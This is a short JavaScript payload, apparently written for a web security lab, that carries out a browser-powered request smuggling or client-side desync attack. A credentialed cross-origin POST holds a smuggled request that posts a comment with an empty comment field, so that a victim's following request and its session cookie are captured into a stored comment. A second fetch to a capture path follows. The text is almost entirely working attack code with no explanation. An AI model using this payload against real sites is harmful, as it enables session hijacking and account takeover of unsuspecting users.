fetch('https://LAB-ID', {
  method: 'POST',
  body: 'POST /en/post/comment HTTP/1.1\r\nHost: LAB-ID\r\nCookie: session=...; _lab_analytics=...\r\nContent-Length: N\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=...&postId=...&name=wiener&email=...&comment=',
  mode: 'cors',
  credentials: 'include',
}).catch(() => {
  fetch('https://LAB-ID/capture-me', {
    mode: 'no-cors',
    credentials: 'include'
  })
});
